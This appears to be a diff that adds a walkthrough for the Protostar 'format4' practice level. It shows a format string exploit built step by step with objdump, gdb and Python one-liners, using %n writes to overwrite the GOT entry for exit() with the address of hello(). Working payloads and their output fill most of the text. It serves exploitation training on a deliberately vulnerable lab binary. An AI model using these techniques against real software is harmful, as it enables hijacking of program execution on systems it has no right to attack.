@@ -1,0 +1,64 @@
+We'll overwrite exit() function in .got with hello() function:
+-------------------------------------------
+- get to the format string on the stack
+$ python -c 'print "AAAABBBBCCCCDDDD" + "X"* 3 + "%x"*7' | ./format4
+AAAABBBBCCCCDDDDXXX200b7fd8420bffff61441414141424242424343434344444444
+
+- get the address of exit() function in .got:
+$ objdump -R format4 | grep exit
+08049724 R_386_JUMP_SLOT   exit
+
+- get the address of hello() function:
+$ objdump --syms format4  | grep hello
+080484b4 g     F .text	0000001e              hello
+
+The address we want to overwrite (4 bytes): 08049724, 08049725, 08049726, 08049727.
+We'll test in gdb to see how our format string works. 
+Begin with this formt string:
+"\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "X"* 3 + "%1$x%4$x" + "%1$x%5$x" + "%1$x%6$x" + "%1$x%7$x"
+
+Nice trick with GDB:
+1. Run commands through GDB until completion:
+    echo commands | gdb X
+2. To keep the command prompt after running those commands:
+    (echo commands; cat) | gdb X
+    
+- We'll use the second variant to tweak the address we overwrite exit() with:
+$ (echo " b *vuln+61"; echo "run"; echo `python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "X"* 3 + "%1$010x%4$n" + "%1$010x%5$n" + "%1$010x%6$n" + "%1$010x%7$n"'`; cat) | gdb -q format4
+Reading symbols from /opt/protostar/bin/format4...done.
+(gdb) Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.
+(gdb) Starting program: /opt/protostar/bin/format4 
+$�%�&�'�XXX24342578243425782434257824342578
+
+Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
+22	format4/format4.c: No such file or directory.
+	in format4/format4.c
+(gdb) x 0x08049724      
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x332b231b
+(gdb) 
+
+After woking it out we get the correct padding and overwrite it with the address
+of hello (0x080484b4):
+$ (echo "b *vuln+61"; echo "run"; echo `python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "X"* 3 + "%1$0161x%4$n" + "%1$0208x%5$n" + "%1$0128x%6$n" + "%1$04x%7$n"'`;  cat) | gdb -q format4
+Reading symbols from /opt/protostar/bin/format4...done.
+(gdb) Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.
+(gdb) Starting program: /opt/protostar/bin/format4 
+$�%�&�'�XXX000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000200
+
+Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
+22	format4/format4.c: No such file or directory.
+	in format4/format4.c
+(gdb)  x 0x08049724 
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080484b4
+(gdb) 
+Continuing.
+code execution redirected! you win
+
+Program exited with code 01.
+(gdb) 
+    
+- and should be the same without gdb:
+$ python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "X"* 3 + "%1$0161x%4$n" + "%1$0208x%5$n" + "%1$0128x%6$n" + "%1$04x%7$n"' | ./format4
+$�%�&�'�XXX000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000200
+code execution redirected! you win
+        
